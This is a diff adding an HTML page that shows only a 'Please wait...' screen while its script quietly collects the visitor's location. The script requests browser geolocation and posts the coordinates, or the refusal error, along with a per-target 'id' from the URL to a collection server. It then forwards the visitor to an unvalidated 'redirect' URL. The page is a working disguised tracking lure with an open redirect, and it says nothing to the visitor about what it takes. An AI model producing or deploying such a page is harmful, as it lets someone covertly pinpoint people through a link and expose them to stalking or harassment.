@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="min-h-screen flex items-center justify-center">
+    <div class="bg-white p-8 rounded shadow-md">
+        <h1 class="text-2xl font-bold mb-4">Please wait...</h1>
+        <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" onclick="window.location.href = window.location.href">Enter</button>
+    </div>
+</body>
+<script>
+
+const params = new URLSearchParams(window.location.search);
+const queryName = params.get('id');
+const redirectTo = params.get('redirect');
+
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+} else {
+    console.log("Geolocation is not supported by this browser.");
+}
+
+async function successCallback(position) {
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    console.log("Latitude: " + latitude);
+    console.log("Longitude: " + longitude);
+    await sendToServer(latitude, longitude, queryName);
+    window.location.href = redirectTo;
+}
+
+async function errorCallback(error) {
+    console.log("Error getting location: " + error.message);
+    await sendErrorToServer(error.message.toString(), queryName);
+    window.location.href = redirectTo;
+}
+
+async function sendToServer(latitude, longitude){
+    const response = await fetch('http://localhost:5000/api/notify', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({latitude: latitude, longitude: longitude, queryName: queryName, redirectTo: redirectTo}),
+    })
+}
+
+async function sendErrorToServer(error){
+    const response = await fetch('http://localhost:5000/api/notify', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({error: error, queryName: queryName, redirectTo: redirectTo}),
+    })
+}
+
+</script>
+</html>
